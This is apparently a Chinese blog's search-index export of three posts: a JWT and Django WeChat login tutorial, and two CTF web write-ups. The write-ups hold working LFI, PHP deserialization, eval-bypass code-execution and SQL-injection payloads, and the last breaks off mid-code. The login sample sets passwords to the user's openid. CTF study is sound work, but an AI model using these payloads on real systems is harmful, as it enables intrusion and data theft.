<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Django基于JWT实现微信小程序的登录和鉴权]]></title>
    <url>%2F2019%2FDjango%E5%9F%BA%E4%BA%8EJWT%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%99%BB%E5%BD%95%E5%92%8C%E9%89%B4%E6%9D%83%2F</url>
    <content type="text"><![CDATA[什么是JWT?JWT，全称Json Web Token，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。 与Session的区别一、Session是在服务器端的，而JWT是在客户端的，这点很重要。二、流程不同： JWT使用场景 大量需要进行跨域的站点 服务器运算能力较差、存储空间较小 JWT的原理JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。12345&#123; &quot;姓名&quot;: &quot;张三&quot;, &quot;角色&quot;: &quot;管理员&quot;, &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;&#125; 以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。 服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。 JWT数据的格式实际的 JWT 大概就像下面这样。 它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的，这里只是为了便于展示，将它写成了几行。 JWT 的三个部分依次如下。 Header（头部） Payload（负载） Signature（签名） HeaderHeader 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。 1234&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; 上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。 最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串。 PayloadPayload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。 iss (issuer)：签发人 exp (expiration time)：过期时间 sub (subject)：主题 aud (audience)：受众 nbf (Not Before)：生效时间 iat (Issued At)：签发时间 jti (JWT ID)：编号 除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。 12345&#123; &quot;sub&quot;: &quot;1234567890&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true&#125; 注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。 这个 JSON 对象也要使用 Base64URL 算法转成字符串。 SignatureSignature 部分是对前两部分的签名，防止数据篡改。 首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。 1234HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。 Base64URL前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。 JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api.example.com/?token=xxx）。Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。 JWT的使用方式客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。 此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息Authorization字段里面。1Authorization: Bearer &lt;token&gt; 另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。 JWT 的几个特点（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。 （2）JWT 不加密的情况下，不能将秘密数据写入 JWT。 （3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。 （4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。 （5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。 （6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。 内容说明以上主要内容转载于廖雪峰的网络日志 实例：使用Django完成微信小程序的JWT登录及鉴权网上目前已经有了一些文章来说明了，可是我在查阅的时候发现大多讲得不是很清楚。 基本了解通过之前的内容铺垫，相信读者对于JWT都有了一定的了解，总的来说，便是JWT是保存在用户端的Token机制。 需要注意的是：JWT默认是无加密的，只是使用了一层Base64编码，所以我们不能将重要信息，如密码等放入header和payload字段中。 开始对于Django来说，这里我们使用djangorestframework-jwt库 安装命令：1pip install djangorestframework-jwt 注意djangorestframework-jwt库默认将settings里的SECRET_KEY当中jwt加密秘钥。 首先我们先去我们的project下的settings文件内设置jwt库的一些参数12345678910111213import datetime# 在末尾添加上REST_FRAMEWORK = &#123;&apos;DEFAULT_AUTHENTICATION_CLASSES&apos;: ( &apos;rest_framework_jwt.authentication.JSONWebTokenAuthentication&apos;,# JWT认证，在前面的认证方案优先 &apos;rest_framework.authentication.SessionAuthentication&apos;, &apos;rest_framework.authentication.BasicAuthentication&apos;, ),&#125;JWT_AUTH = &#123; &apos;JWT_EXPIRATION_DELTA&apos;: datetime.timedelta(days=1), #JWT_EXPIRATION_DELTA 指明token的有效期&#125; 登录函数的实现：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&apos;&apos;&apos;登录函数：&apos;&apos;&apos;def get_user_info_func(user_code): api_url = &apos;https://api.weixin.qq.com/sns/jscode2session?appid=&#123;0&#125;&amp;secret=&#123;1&#125;&amp;js_code=&#123;2&#125;&amp;grant_type=authorization_code&apos; get_url = api_url.format(App_id,App_secret,user_code) r = requests.get(get_url) return r.json()@require_http_methods([&apos;POST&apos;])def user_login_func(request): try: user_code = request.POST.get(&apos;user_code&apos;) print(user_code) if user_code == None: print(request.body) json_data = json.loads(request.body) user_code = json_data[&apos;user_code&apos;] print(user_code) except: return JsonResponse(&#123;&apos;status&apos;:500,&apos;error&apos;:&apos;请输入完整数据&apos;&#125;) try: json_data = get_user_info_func(user_code) #json_data = &#123;&apos;errcode&apos;:0,&apos;openid&apos;:&apos;111&apos;,&apos;session_key&apos;:&apos;test&apos;&#125; if &apos;errcode&apos; in json_data: return JsonResponse(&#123;&apos;status&apos;: 500, &apos;error&apos;: &apos;验证错误：&apos; + json_data[&apos;errmsg&apos;]&#125;) res = login_or_create_account(json_data) return JsonResponse(res) except: return JsonResponse(&#123;&apos;status&apos;:500,&apos;error&apos;:&apos;无法与微信验证端连接&apos;&#125;)def login_or_create_account(json_data): openid = json_data[&apos;openid&apos;] session_key = json_data[&apos;session_key&apos;] try: user = User.objects.get(username=openid) except: user = User.objects.create( username=openid, password=openid, ) user.session_key = session_key user.save() try: jwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLER jwt_encode_handler = api_settings.JWT_ENCODE_HANDLER payload = jwt_payload_handler(user) token = jwt_encode_handler(payload) res = &#123; &apos;status&apos;: 200, &apos;token&apos;: token &#125; except: res = &#123; &apos;status&apos;: 500, &apos;error&apos;: &apos;jwt验证失败&apos; &#125; return res 视图函数：123456789101112131415161718192021222324252627282930313233343536373839&apos;&apos;&apos;视图样例：&apos;&apos;&apos;from django.http import JsonResponsefrom account.models import *from rest_framework_jwt.views import APIViewfrom rest_framework import authenticationfrom rest_framework.permissions import IsAuthenticatedfrom rest_framework_jwt.authentication import JSONWebTokenAuthenticationfrom rest_framework import permissionsclass IsOwnerOrReadOnly(permissions.BasePermission): def has_object_permission(self, request, view, obj): if request.method in [&apos;GET&apos;,&apos;POST&apos;]: return True return obj.user == request.userclass test_view(APIView): http_method_names = [&apos;post&apos;] #限制api的访问方式 authentication_classes = (authentication.SessionAuthentication,JSONWebTokenAuthentication) permission_classes = (IsAuthenticated,IsOwnerOrReadOnly) #权限管理 def post(self,request): #视图函数 user = request.user.username U = User.objects.get(username=user) json_data = json.loads(request.body) try: test = json_data[&apos;&apos;] except: return JsonResponse(&#123;&apos;status&apos;:500,&apos;errmsg&apos;:&apos;参数不全&apos;&#125;) try: U.sex = sex U.weight = weight U.height = height U.save() except: return JsonResponse(&#123;&apos;status&apos;: 500, &apos;errmsg&apos;: &apos;数据库错误&apos;&#125;) return JsonResponse(&#123;&apos;status&apos;:200&#125;) urls.py:12345urlpatterns = [ re_path(&apos;^$&apos;, index), re_path(&apos;^login$&apos;,login), # 登录 re_path(&apos;^test$&apos;,test_view.as_view())] 从一道CTF引发的对JWT安全的简单思考引例题目：2019ISCC Web6 解题关键： 改题的加密方式为：RS256，是一种非对称加密，分有公钥和私钥。 其中： 私钥加密 公钥解密 当公钥泄露时，将JWT中的Header部分算法改为对称加密，攻击者本地使用泄露的公司进行Token伪造，将获取到的Token发送给验证端时，会使用公钥按照Header中的算法进行解密，而在原来的Header中算法为RS256，需要私钥加密生成Token，可是当我们修改为对称加密的HS256时，我们便可以成功伪造Token，且服务端也可以正常验证。 产生这一问题的主要原因便是，HWT的Header段是可控制的，通常只经过一层base64编码处理，也就是说解密算法可有用户控制。 防御：保护公钥不泄露，将Header段经RSA等方法加密。 其他问题 密钥可控 密钥爆破 特殊情况，不做深入，感兴趣的可见https://www.anquanke.com/post/id/145540#h3-9]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>JWT</tag>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019全国大学生信息安全大赛两道web]]></title>
    <url>%2F2019%2F2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E8%B5%9B%E4%B8%A4%E9%A2%98WEB%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[简单小结菜鸟第一次打国赛，这次题目质量很高，学到了许多姿势。 WebJustsoso打开题目，源代码出存在提示：使用LFI读取index.php与hint.php123http://d4dc224926cd47bca560b0ec2f84bad155efe5b747574b89.changame.ichunqiu.com/?file=php://filter/read=convert.base64-encode/resource=index.phphttp://d4dc224926cd47bca560b0ec2f84bad155efe5b747574b89.changame.ichunqiu.com/?file=php://filter/read=convert.base64-encode/resource=hint.php 得如下源码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET[&quot;file&quot;]; $payload = $_GET[&quot;payload&quot;];if(!isset($file))&#123; echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;&#125;if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&apos;hack attacked!!!&apos;);&#125;@include($file);if(isset($payload))&#123; $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]); parse_str($url[&apos;query&apos;],$query); foreach($query as $value)&#123; if (preg_match(&quot;/flag/&quot;,$value)) &#123; die(&apos;stop hacking!&apos;); exit(); &#125; &#125; $payload = unserialize($payload);&#125;else&#123; echo &quot;Missing parameters&quot;; &#125; ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt;&lt;?php class Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo &quot;Waking up\n&quot;; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) &#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125;?&gt; 很容易可以知道此题考的是php反序列化，通过file引入hint.php到index.php，操作payload反序列化执行类中的getflag()函数此题有两个难点：正则Flag判断绕过与随机数md5判断的绕过前者可通过使用 ///绕过parse_url()函数，此时该函数获取到的内容为空，而后者可以使用指针来将token_flag指向token，来使两者恒等。 添加以下代码在本地生成序列化字符串：1234$a = new Flag(‘flag.php’);$a-&gt;token_flag = &amp;$a-&gt;token;$b = new Handle($a);echo urlencode(serialize($b)); 输出的结果为：1O%3A6%3A%22Handle%22%3A1%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22bc573864331a9e42e4511de6f678aa83%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D 注意里边有不可见字符%00，且需要将Handle的对象数量改成2+，这样才可以进入__destruct函数。故最终payload为：1///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;bc573864331a9e42e4511de6f678aa83&quot;;s:10:&quot;token_flag&quot;;R:4;&#125;&#125; love_math打开题目，发现在js地址出使用ajax向calc.php发送数据使用浏览器访问之，得源码12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&apos;c&apos;]))&#123; show_source(__FILE__); &#125;else&#123; //例子 c=20-1 $content = $_GET[&apos;c&apos;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;]; preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&apos;echo &apos;.$content.&apos;;&apos;); &#125; 可以看到过滤了一些常用字符和基于白名单的过滤，限制得比较死，故此处我们只能使用白名单内的函数来进行命令执行，且不能有黑名单内的字符。 我们注意到，白名单里边的base_convert、dechex、decbin等用于进制转换的函数，我们可以使用其来绕过基于白名单的检测。比如：phpinfo可以将phpinfo先转换成hex，在转换成十进制，这样就可以做到无字母执行函数。 由于长度问题，我们无法直接在参数c里传过多的白名单函数+字符，所以这里我们使用其他GET参数传入，不直接使用参数c，即可绕过，但要注意的是此处的参数名，不能为字母，只能为数字，不然会被第二个关键词白名单所拦截。 再由于Ascii转成Hex后转回来需要hex2bin函数，而白名单里并没有这个函数，所以我们需要使用进制转换进行绕过，又因为hex2bin里部分字母只有在32进制后才会出现，所以此处我们选择36进制。将hex2bin由36进制成无字母的10进制得到：37907361743我们使用base_convert（37907361743，10,36即可转换成hex2bin，而_GET的hex为5f474554，里边包含了字母f，需要在进行一次转换：f正好为16进制里的最后一个字母，可直接使用dechex(1598506324)即可绕过。故$sin=base_convert(37907361743,10,36)(dechex(1598506324))即为$sin=_GET接着我们继续构造:我们知道：$$sin = $_GET那么$$sin[a]()即可自定义函数名，但主要此处参数不可为字母，且[]被过滤，故改成$$sin{0}($$sin{1})`所以payload构造如下：1?C=$sin=base_convert(37907361743,10,36)(dechex(1598506324));$$sin&#123;0&#125;($$sin&#123;1&#125;);&amp;0=show_source&amp;1=flag.php]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百道CTF刷题记录(一)]]></title>
    <url>%2F2019%2F%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[简介最近在刷CTF题，主攻Web，兼职Misc Shiyanbar0x01 简单的登陆题简单概括： 考点： %00截断正则 CBC字节翻转攻击 难度： 难 WP：https://blog.csdn.net/include_heqile/article/details/79942993 解题过程：F12查看响应头，发现返回tips访问test.php文件得到源代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpdefine(&quot;SECRET_KEY&quot;, &apos;***********&apos;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);error_reporting(0);include(&apos;conn.php&apos;);function sqliCheck($str)&#123; if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str))&#123; return 1; &#125; return 0;&#125;function get_random_iv()&#123; $random_iv=&apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));&#125;function show_homepage()&#123; global $link; if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link)))&#123; $rows=mysqli_fetch_array($result); echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;; &#125; else&#123; echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;; &#125; &#125;else&#123; die(&quot;ERROR!&quot;); &#125; &#125;&#125;if(isset($_POST[&apos;id&apos;]))&#123; $id = (string)$_POST[&apos;id&apos;]; if(sqliCheck($id)) die(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;); $info = array(&apos;id&apos;=&gt;$id); login($info); echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;&#125;else&#123; if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123; show_homepage(); &#125;else&#123; echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt; &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;input id to login&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&apos;; &#125;&#125;?&gt; 代码分析： sqliCheck函数负责过滤sql注入 get_random_iv 生成16位随机数(Asicc范围在0~255内)iv 漏洞原因：aes-128-cbc加密存在CBC翻转攻击(不理解，暂时跳过) 0x02 后台登录简单概括： 考点：md5()函数16位二进制格式绕过，md5(&quot;ffifdyop&quot;,True)得到的加密字符串为&#39;or&#39;6&lt;crash&gt;(注：or &#39;数字+字母&#39; 等价于or true) 难度：易 WP：https://blog.csdn.net/qq_36791003/article/details/81746730 解题过程：打开网页，右键查看源代码发现源码：123456789&lt;!-- $password=$_POST[&apos;password&apos;];$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;$result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0)&#123; echo &apos;flag is :&apos;.$flag; &#125; else&#123; echo &apos;密码错误!&apos;; &#125; --&gt; 上网查了下，了解到md5($password,true)返回的是原始 16 字符二进制格式的密文,返回的内容可以存在单引号，故我们可以找个字符串，使其md5(str,true)加密过返回的字符串与原sql语句拼接造成SQL注入攻击。经过简单的Fuzz,我们知道：字符串&#39;or&#39;6&lt;乱码&gt;&quot;，此时如果拼接到sql语句中，那么这条语句将会变成一条永真式，因此成功登录，获得flag。 0x03 加了料的报错注入简单概括： 考点：双参数注释绕过，=被过滤可用regexp &#39;xxx&#39;和in (0xaaaa)代替 难度： 中 WP：https://www.jianshu.com/p/95f18a32ec7b 解题过程：观察题目可知此题考的是报错注入，右键源代码得到提升：Post发送username&amp;password。sql语句如下：1$sql=&quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&quot;; 注意：此处可控的参数有两个。简单手工测试，发现过滤了#，and等关键字，而且username处单独过滤了右括号，这意味着我们无法再username出使用函数，因而我们将目光转向password。经过一番人工Fuzz，发现只有exp()函数没有被过滤，故我们构造语句：exp(~(select * from(select user())a))成功爆出用户名。最终我们的payload如下：12345678username=a&apos;/*&amp;password=*/Or exp(~(select * from(select database())a))or&apos;1 //查询当前数据库username=a&apos;/*&amp;password=*/Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp &apos;error_based_hpf&apos;)a))or&apos;1 //查询表名，此处由于=被过滤，我们使用regexp来绕过username=a&apos;/*&amp;password=*/Or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;)a))or&apos;1//查询列名，此处由于and被过滤，故而不加数据库名的验证，在实际渗透中最好还是尽量加上。username=a&apos;/*&amp;password=*/Or exp(~(select * from(select group_concat(value) from ffll44jj)a))or&apos;1//获取flag 0x04 认真一点！简单概括： 考点：双层叠加绕过过滤，大小写绕过，from()for()代替偏移，布尔盲注 难度：难 WP：https://blog.csdn.net/xingyyn78/article/details/79747404 解题过程：打开网页，随便输入个数字，页面返回You are in...，输入在数字后加单引号，返回You are not in...。猜测此处考的是bool盲注，根据页面返回的内容判断真假。经过一番简单的fuzz，发现此处过滤的函数只会过滤一次，那么我们可以将过滤关键词双写：oorr就好了。1234id=aaa&apos;oorr(1=1)=&apos;1 //返回You are inid=aaa&apos;oorr(1=2)=&apos;1 //返回You are not in// 此处的aaa是为了让前边条件为假，那么sql语句的判断将依赖于后边的语句// 即：false ∪ (条件一) = 条件一 我们先判断数据库长度：1id=aaa&apos;oorr(length(database())&gt;1)=&apos;1 其次循环取数据库名进行判断：12id=aaa&apos;oorr(mid((select+database())from(1)foorr(1))=&apos;c&apos;)=&apos;1 //由于,被过滤，使用from与for进行绕过，记得for要写成foorr绕过过滤，+号绕过空格过滤 接着循环判断表名：1id=aaa&apos;oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(1)foorr(1))=&apos;a&apos;)=&apos;1 之后就不写了，与上边类似，写脚本跑就好。 0x05 你真的会PHP吗？简单概括： 考点：is_numeric函数的绕过(%20|%00)、PHP32位系统整数型变量最大值为：2147483647(2^31-1) 64位：9223372036854775807(2^63-1) 难度：中 WP：https://blog.csdn.net/JBlock/article/details/78745513 解题过程：打开题目，发现返回头存在提示信息：打开链接获得源码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_POST[&apos;number&apos;]))&#123; header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;); die(&quot;have a fun!!&quot;); &#125;foreach([$_POST] as $global_var) &#123; foreach($global_var as $key =&gt; $value) &#123; $value = trim($value); is_string($value) &amp;&amp; $req[$key] = addslashes($value); &#125; &#125; function is_palindrome_number($number) &#123; $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i &lt; $j) &#123; if($number[$i] !== $number[$j]) &#123; return false; &#125; $i++; $j--; &#125; return true; &#125; if(is_numeric($_REQUEST[&apos;number&apos;]))&#123; $info=&quot;sorry, you cann&apos;t input a number!&quot;;&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123; $info = &quot;number must be equal to it&apos;s integer!! &quot;; &#125;else&#123; $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2)&#123; $info=&quot;no, this is not a palindrome number!&quot;; &#125;else&#123; if(is_palindrome_number($req[&quot;number&quot;]))&#123; $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; &#125;else&#123; $info=$flag; &#125; &#125;&#125;echo $info;?&gt; 代码流程：is_numeric[false] &amp;&amp; $req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))[false]-&gt; $value1!=$value2[false]-&gt; is_palindrome_number($req[&quot;number&quot;])[true] 我们知道is_numeric函数与ereg函数一样，存在截断漏洞，而第二个if判断存在弱类型比较的漏洞，我们将这两个漏洞组合起来打一套组合拳。PHP语言对于32位系统的int变量来说，最大值是2147483647，如果我们传入的数值为2147483647的话，经过strrev函数反转再转成int函数仍是2147483647，因为746384741&gt;2147483647，转成int变量会减小成2147483647，故而绕过看似矛盾的条件。而对于开始的is_numeric，加上%00或%20即可，此时is_numeric函数便不会认为这是个数字，而对于下边的strval()in、intval()却无影响。综上所述，我们的number应为：2147483647%00、2147483647%20、%002147483647。 此处%20不能再开头的原因是intval()会将其转换成数字0，而%00无影响。 0x06 登陆一下好吗??简单概括： 考点：登录框万能密码 难度：中 WP：https://blog.csdn.net/h1012946585/article/details/79851884 解题过程：打开页面，猜测考的是万能密码，手动Fuzz发现过滤了or，故改用&#39;=&#39;成功。 0x07 who are you?简单概括： 考点：时间盲注，and case when () then () else () end绕过逗号过滤。 难度：中 WP：https://blog.csdn.net/wy_97/article/details/75643252 解题过程：抓包，发现回显的数据貌似是直接取header的值，没有经过数据库，使用报错注入失败，猜测是盲注，由于bool盲注返回的页面一致，故此题应为时间盲注：简单测试发现逗号被过滤，导致我们无法使用if语句，不过我们可以换成case when then else语句代替： X-Forwarded-For: 127.0.0.1’and case when(length(database())&gt;1)then(sleep(5))else(sleep(0))end and ‘1 剩下的就是写脚本慢慢跑了，此处略过。 0x08 因缺思汀的绕过简单概括： 考点：gourp by xxx with rollup limit 1 offset x#【创建虚拟表最后一行为pwd的值为NULL，借用offset偏移到最后一个，post传输空的pwd，满足条件】 难度：中 WP：https://blog.csdn.net/qq_35078631/article/details/54772798 解题过程：右键源代码得到提示信息source.txt，打开得到源码。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) &#123; echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo 